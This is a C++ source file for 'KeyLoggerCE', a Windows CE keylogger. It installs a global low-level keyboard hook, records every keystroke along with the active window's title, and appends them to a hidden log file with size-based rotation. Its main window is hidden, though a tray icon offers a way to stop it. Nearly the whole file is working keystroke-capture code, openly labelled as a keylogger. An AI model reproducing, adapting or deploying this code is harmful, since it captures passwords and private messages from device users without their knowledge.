// keyLoggerCE.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "keyLoggerCE.h"

#include "hooks.h"

#include <fstream>
#include <time.h>
#include "log2file.h"

#include "vk_codes.h"

TCHAR szAppName[] = L"KeyLoggerCE v0.0.1";
char szAppNameA[] = "KeyLoggerCE v0.0.1";

// Initialize a keyboard HHOOK
HHOOK KeyboardHook;

void write(const char* c, ...);

#define MAX_LOADSTRING 100

char* getAscTime(char* szString){
	TCHAR str[512];
	TCHAR lpTimeStr[128];
	char lpTimeStrA[128];
	LONG res;
	wsprintf(str,L"");
	//Read the system time
	res = GetTimeFormat(LOCALE_SYSTEM_DEFAULT,
							TIME_FORCE24HOURFORMAT,
							NULL,
							L"hh:mm:ss",
							lpTimeStr,
							sizeof (lpTimeStr ) * sizeof(TCHAR));
	if (res == 0)
	{
		wcscpy(lpTimeStr, L"err");
	}
	wcstombs(lpTimeStrA, lpTimeStr, 128);
	sprintf(szString, "%s", lpTimeStrA);
	return szString;
}
char* getAscDate(char* szString){
	TCHAR str[512];
	TCHAR lpDateStr[128];
	char lpDateStrA[128];
	LONG res;
	wsprintf(str,L"");
	//Read the system date
	res = GetDateFormat(  LOCALE_SYSTEM_DEFAULT,
						  NULL,
						  NULL,
						  L"dd.MM.yyyy",
						  lpDateStr,
						  sizeof (lpDateStr) * sizeof(TCHAR));
	if (res == 0)
	{
		wcscpy(lpDateStr, L"err");
	}
	wcstombs(lpDateStrA, lpDateStr, 128);
	sprintf(szString, "%s", lpDateStrA);
	return szString;
}
//###############################################################
// Functions to write to a file
//void write(const char* lpszFormat, ...){
//	int nBuf;
//    char szBuffer[512];
//
//    va_list args;
//    va_start(args, lpszFormat);
//
//    nBuf = vsprintf(szBuffer, lpszFormat, args);
//	write(szBuffer);
//    va_end(args);
//}
void write (TCHAR *lpszFormat, ...) {
    int nBuf;//, i;
    TCHAR szBuffer[512];

    va_list args;
    va_start(args, lpszFormat);

    nBuf = vswprintf(szBuffer, lpszFormat, args);
	char szBufferA[512];
	wcstombs(szBufferA, szBuffer, 512);
	write(szBufferA);
    va_end(args);
}

void write(const char* c, ...)
{
	DEBUGMSG(1, (L"in write...\n"));
	int nBuf;
	char szBufferA[512];
    va_list args;
    va_start(args, c);
    nBuf = vsprintf(szBufferA, c, args);
	va_end(args);

	char fileLocation[MAX_PATH];
	TCHAR fileLocationW[MAX_PATH];

	sprintf(fileLocation, "%s", "\\keylog.txt"); // Define the location of log file
	mbstowcs(fileLocationW,fileLocation,MAX_PATH);

	//check file size
	//#### we maintain two log files, an actual and a bak one
	//get file size
	HANDLE hFile = CreateFile(fileLocationW, 
       GENERIC_READ,          // open for writing
       FILE_SHARE_READ,       // share
       NULL,                   // default security
       OPEN_EXISTING,          // open existing
       FILE_ATTRIBUTE_NORMAL,  // normal file
       NULL);                  // no attr. template
	if(hFile!=NULL){
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		CloseHandle(hFile);
		if(dwFileSize != 0xFFFFFFFF){ //no error
			if(dwFileSize>0x100000){ //more than 1MB?
				//make a backup
				//delete previous bak
				TCHAR fileLocationWBAK[MAX_PATH];
				wsprintf(fileLocationWBAK, L"%s.bak", fileLocationW);
				DeleteFile(fileLocationWBAK);
				//rename old file to .BAK
				MoveFile(fileLocationW, fileLocationWBAK);
				//sync names
				wcstombs(fileLocation, fileLocationW, MAX_PATH);
			}
		}
	}

	FILE *f = fopen(fileLocation,"a+"); // Open the log file in append mode
	if(f!=NULL)
	{
		fputs(szBufferA,f); // Write to end of the file
		fflush(f);
		fclose(f); // Close the file
	}
	DEBUGMSG(1, (L"...out write\n"));
}
void write(const TCHAR* c)
{
	char txtA[MAX_PATH];
	memset(txtA,0,MAX_PATH);
	wcstombs(txtA, c, MAX_PATH);
	write(txtA);
}

// Is shift key down ?
bool shift = false;
// Store window
HWND oldWindow = NULL;
// Window text
char cWindow[MAX_PATH];
TCHAR cWindowW[MAX_PATH];

//=========================================================================
#pragma data_seg(".HOOKDATA")									//	Shared data (memory) among all instances.
	HHOOK g_hInstalledLLKBDhook = NULL;						// Handle to low-level keyboard hook
	//HWND hWnd	= NULL;											// If in a DLL, handle to app window receiving WM_USER+n message
#pragma data_seg()

	NOTIFYICONDATA nid;

// Global variables can still be your...friend.
// CIHookDlg* g_This			= NULL;			// Needed for this kludgy test app, allows callback to update the UI
HINSTANCE g_hInstance		= NULL;			// Handle to app calling the hook (me!)
HINSTANCE  g_hHookApiDLL	= NULL;			// Handle to loaded library (system DLL where the API is located)
//HHOOK g_hInstalledLLKBDhook = NULL;			// Handle to low-level keyboard hook

// Global functions: The original Open Source
BOOL g_HookDeactivate();
BOOL g_HookActivate(HINSTANCE hInstance);

//
void ShowIcon(HWND hWnd, HINSTANCE hInst);
void RemoveIcon(HWND hWnd);


#pragma comment(linker, "/SECTION:.HOOKDATA,RWS")		//linker directive
//=========================================================================
// Callback function to be hooked
// The command below tells the OS that this EXE has an export function so we can use the global hook without a DLL
__declspec(dllexport) LRESULT CALLBACK g_LLKeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    int bControlKeyDown=0;
	// Get current state of capsLock
	bool caps = GetKeyState(VK_CAPITAL) < 0;
    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *) lParam;
	if(nCode == HC_ACTION){
		HWND newWindow = GetForegroundWindow();
		if(oldWindow == NULL || newWindow != oldWindow){
			// Get Active window title and store it
			GetWindowText(GetForegroundWindow(), cWindowW, MAX_PATH);
			write("\nActive Window: '");
			write(cWindowW);
			write("'\n");
			oldWindow = newWindow;
		}
		// Determine the current state of shift key
		if(p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT || p->vkCode == VK_SHIFT){
			if(wParam == WM_KEYDOWN)
			{
				DEBUGMSG(1, (L"SHIFT = ON\n"));
				shift = true;
			}
			else
			{
				DEBUGMSG(1, (L"SHIFT = OFF\n"));
				shift = false;
			}
		}
		// Start logging keys
		if(wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) // If key has been pressed
		{
			DEBUGMSG(1,(L"in hook\n"));
			// Virtual key codes reference: http://msdn.microsoft.com/en-us/library/dd375731%28v=VS.85%29.aspx
			char str[32];
			write("%s", getVKString(str, p->vkCode, shift));
		}
	}
	// Forward the event to other hooks
    return CallNextHookEx(NULL,nCode,wParam,lParam);
}

BOOL g_HookActivate(HINSTANCE hInstance)
{
	// We manually load these standard Win32 API calls (Microsoft says "unsupported in CE")
	SetWindowsHookEx		= NULL;
	CallNextHookEx			= NULL;
	UnhookWindowsHookEx	= NULL;

	// Load the core library. If it's not found, you've got CErious issues :-O
	//TRACE(_T("LoadLibrary(coredll.dll)..."));
	g_hHookApiDLL = LoadLibrary(_T("coredll.dll"));
	if(g_hHookApiDLL == NULL) {
		Add2Log(L"g_HookActivate: LoadLibrary FAILED...\r\n", FALSE);
		return false;
	}
	else {
		// Load the SetWindowsHookEx API call (wide-char)
		//TRACE(_T("OK\nGetProcAddress(SetWindowsHookExW)..."));
		SetWindowsHookEx = (_SetWindowsHookExW)GetProcAddress(g_hHookApiDLL, _T("SetWindowsHookExW"));
		if(SetWindowsHookEx == NULL) {
			Add2Log(L"g_HookActivate: GetProcAddress(SetWindowsHookEx) FAILED...\r\n", FALSE);
			return false;
		}
		else
		{
			Add2Log(L"g_HookActivate: GetProcAddress(SetWindowsHookEx) OK...\r\n", FALSE);
			// Load the hook.  Save the handle to the hook for later destruction.
			//TRACE(_T("OK\nCalling SetWindowsHookEx..."));
			g_hInstalledLLKBDhook = SetWindowsHookEx(WH_KEYBOARD_LL, g_LLKeyboardHookCallback, hInstance, 0);
			if(g_hInstalledLLKBDhook == NULL) {
				Add2Log(L"g_HookActivate: SetWindowsHookEx FAILED...\r\n", FALSE);
				return false;
			}
			else
				Add2Log(L"g_HookActivate: SetWindowsHookEx OK...\r\n", FALSE);

		}

		// Get pointer to CallNextHookEx()
		//TRACE(_T("OK\nGetProcAddress(CallNextHookEx)..."));
		CallNextHookEx = (_CallNextHookEx)GetProcAddress(g_hHookApiDLL, _T("CallNextHookEx"));
		if(CallNextHookEx == NULL) {
			Add2Log(L"g_HookActivate: GetProcAddress(CallNextHookEx) FAILED...\r\n", FALSE);
			return false;
		}
		else
			Add2Log(L"g_HookActivate: GetProcAddress(CallNextHookEx) OK...\r\n", FALSE);

		// Get pointer to UnhookWindowsHookEx()
		//TRACE(_T("OK\nGetProcAddress(UnhookWindowsHookEx)..."));
		UnhookWindowsHookEx = (_UnhookWindowsHookEx)GetProcAddress(g_hHookApiDLL, _T("UnhookWindowsHookEx"));
		if(UnhookWindowsHookEx == NULL) {
			Add2Log(L"g_HookActivate: GetProcAddress(UnhookWindowsHookEx) FAILED...\r\n", FALSE);
			return false;
		}
		else
			Add2Log(L"g_HookActivate: GetProcAddress(UnhookWindowsHookEx) OK...\r\n", FALSE);
	}
	//TRACE(_T("OK\nEverything loaded OK\n"));
	return true;
}


BOOL g_HookDeactivate()
{
	Add2Log(L"g_HookDeactivate()...\r\n", FALSE);
	//TRACE(_T("Uninstalling hook..."));
	if(g_hInstalledLLKBDhook != NULL)
	{
		Add2Log(L"\tUnhookWindowsHookEx...\r\n", FALSE);
		UnhookWindowsHookEx(g_hInstalledLLKBDhook);		// Note: May not unload immediately because other apps may have me loaded
		g_hInstalledLLKBDhook = NULL;
	}
	else
		Add2Log(L"\tg_hInstalledLLKBDhook is NULL\r\n", FALSE);

	Add2Log(L"\tUnloading coredll.dll...\r\n", FALSE);
	if(g_hHookApiDLL != NULL)
	{
		FreeLibrary(g_hHookApiDLL);
		g_hHookApiDLL = NULL;
	}
	//TRACE(_T("OK\nEverything unloaded OK\n"));
	Add2Log(L"\tEverything unloaded OK\r\n", FALSE);
	return true;
}

//###################################################################

// Global Variables:
HINSTANCE			g_hInst;			// current instance
HWND				g_hWndMenuBar;		// menu bar handle

// Forward declarations of functions included in this code module:
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);


int WINAPI WinMain(HINSTANCE hInstance,
                   HINSTANCE hPrevInstance,
                   LPTSTR    lpCmdLine,
                   int       nCmdShow)
{
	MSG msg;
	WNDCLASS wc;
	
	newfile(L"\\keyloggerce.log.txt");
	//log date/time
	char szTime[128];
	char szDate[128];
	write("\n{%s %s}\n", getAscDate(szDate), getAscTime( szTime ));

	Add2Log(L"###### keyloggerce started...\r\n", FALSE);
	write("###### %s started...\n", szAppNameA);

	g_hInstance=hInstance;

	// Perform application initialization:
	wc.style         = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc   = WndProc;
	wc.cbClsExtra    = 0;
	wc.cbWndExtra    = 0;
	wc.hInstance     = hInstance;
	wc.hIcon         = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYLOGGERCE));
	wc.hCursor       = 0;
	wc.hbrBackground = (HBRUSH) GetStockObject(WHITE_BRUSH);
	wc.lpszMenuName  = 0;
	wc.lpszClassName = szAppName;

	RegisterClass(&wc);

	//create window
    HWND hWnd = CreateWindow(szAppName, 
		L"keyLoggerCE", 
		WS_VISIBLE, 
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
		NULL, 
		NULL, 
		hInstance, 
		NULL);

	if (!IsWindow (hWnd)){ 
		Add2Log(L"Failed to create window! EXIT.\r\n", FALSE);
		return 0; // Fail if not created.
	}
	
	//show a hidden window
	Add2Log(L"ShowWindow hidden\r\n", FALSE);
	ShowWindow   (hWnd , SW_HIDE); // nCmdShow) ;  
	UpdateWindow (hWnd) ;

	//Notification icon
	Add2Log(L"Adding notification icon\r\n", FALSE);
	HICON hIcon;
	hIcon=(HICON) LoadImage (g_hInstance, MAKEINTRESOURCE (IHOOK_STARTED), IMAGE_ICON, 16,16,0);
	nid.cbSize = sizeof (NOTIFYICONDATA);
	nid.hWnd = hWnd;
	nid.uID = 1;
	nid.uFlags = NIF_ICON | NIF_MESSAGE;
	// NIF_TIP not supported    
	nid.uCallbackMessage = MYMSG_TASKBARNOTIFY;
	nid.hIcon = hIcon;
	nid.szTip[0] = '\0';
	BOOL res = Shell_NotifyIcon (NIM_ADD, &nid);
	if(!res){
		DEBUGMSG(1 ,(L"Could not add taskbar icon. LastError=%i\r\n", GetLastError() ));
		Add2Log(L"Could not add taskbar icon. LastError=%i (0x%x)\r\n", GetLastError(), GetLastError());
		RemoveIcon(hWnd);
	}else
		Add2Log(L"Taskbar icon added.\r\n", FALSE);

 	// TODO: Place code here.


	Add2Log(L"Starting message pump...\r\n", FALSE);
	while (GetMessage (&msg , NULL , 0 , 0))   
	{
	  TranslateMessage (&msg) ;         
	  DispatchMessage  (&msg) ;         
	} 
	                                                                      
	Add2Log(L"##### ....hook ending...\r\n", FALSE);
	write("#### keylogger ended. {%s %s}\n", getAscDate(szDate), getAscTime(szTime));

	return msg.wParam ;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND	- process the application menu
//  WM_PAINT	- Paint the main window
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    //PAINTSTRUCT ps;
    //HDC hdc;

//    static SHACTIVATEINFO s_sai;
	
    switch (message) 
    {
        case WM_CREATE:
			Add2Log(L"WM_CREATE\r\nReadReg()\r\n", FALSE);
			if (g_HookActivate(g_hInstance))
			{
				Add2Log(L"g_HookActivate loaded OK\r\n", FALSE);
				MessageBeep(MB_OK);
				//system bar icon
				//ShowIcon(hwnd, g_hInstance);
				DEBUGMSG(1, (L"Hook loaded OK"));
			}
			else
			{
				MessageBeep(MB_ICONEXCLAMATION);
				Add2Log(L"g_HookActivate FAILED. EXIT!\r\n", FALSE);
				MessageBox(hWnd, L"Could not hook. Already running a copy of iHook3? Will exit now.", L"iHook3", MB_OK | MB_ICONEXCLAMATION);
				PostQuitMessage(-1);
			}

            break;
				case WM_PAINT:
				PAINTSTRUCT ps;    
				RECT rect;    
				HDC hdc;     // Adjust the size of the client rectangle to take into account    
				// the command bar height.    
				GetClientRect (hWnd, &rect);    
				hdc = BeginPaint (hWnd, &ps);     
				DrawText (hdc, TEXT ("keyLoggerCE loaded"), -1, &rect,
					DT_CENTER | DT_VCENTER | DT_SINGLELINE);    
				EndPaint (hWnd, &ps);     
				return 0;
				break;
		case MYMSG_TASKBARNOTIFY:
				switch (lParam) {
					case WM_LBUTTONUP:
						//ShowWindow(hwnd, SW_SHOWNORMAL);
						SetWindowPos(hWnd, HWND_TOPMOST, 0,0,0,0, SWP_NOSIZE | SWP_NOREPOSITION | SWP_SHOWWINDOW);
						if (MessageBox(hWnd, L"Hook is loaded. End hooking?", szAppName, 
							MB_YESNO | MB_ICONQUESTION | MB_APPLMODAL | MB_SETFOREGROUND | MB_TOPMOST)==IDYES)
						{
							g_HookDeactivate();
							Shell_NotifyIcon(NIM_DELETE, &nid);
							PostQuitMessage (0) ; 
						}
						ShowWindow(hWnd, SW_HIDE);
					}
			return 0;
			break;

        case WM_DESTROY:
			//taskbar system icon
			RemoveIcon(hWnd);
			MessageBeep(MB_OK);
			g_HookDeactivate();
            PostQuitMessage(0);
			return 0;
            break;

        case WM_ACTIVATE:
            // Notify shell of our activate message
//            SHHandleWMActivate(hWnd, wParam, lParam, &s_sai, FALSE);
            break;
        case WM_SETTINGCHANGE:
//            SHHandleWMSettingChange(hWnd, wParam, lParam, &s_sai);
            break;

        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}


void ShowIcon(HWND hWnd, HINSTANCE hInst)
{
    NOTIFYICONDATA nid;

    int nIconID=1;
    nid.cbSize = sizeof (NOTIFYICONDATA);
    nid.hWnd = hWnd;
    nid.uID = nIconID;
    nid.uFlags = NIF_ICON | NIF_MESSAGE;   // NIF_TIP not supported
    nid.uCallbackMessage = MYMSG_TASKBARNOTIFY;
    nid.hIcon = (HICON)LoadImage (g_hInstance, MAKEINTRESOURCE (ID_ICON), IMAGE_ICON, 16,16,0);
    nid.szTip[0] = '\0';

    BOOL r = Shell_NotifyIcon (NIM_ADD, &nid);
	if(!r){
		DEBUGMSG(1 ,(L"Could not add taskbar icon. LastError=%i\r\n", GetLastError() ));
		Add2Log(L"Could not add taskbar icon. LastError=%i (0x%x)\r\n", GetLastError(), GetLastError() );
	}

}

void RemoveIcon(HWND hWnd)
{
	NOTIFYICONDATA nid;

    memset (&nid, 0, sizeof nid);
    nid.cbSize = sizeof (NOTIFYICONDATA);
    nid.hWnd = hWnd;
    nid.uID = 1;

    Shell_NotifyIcon (NIM_DELETE, &nid);
	Add2Log(L"Shell_NotifyIcon(NIM_DELETE) done.\r\n",FALSE );

}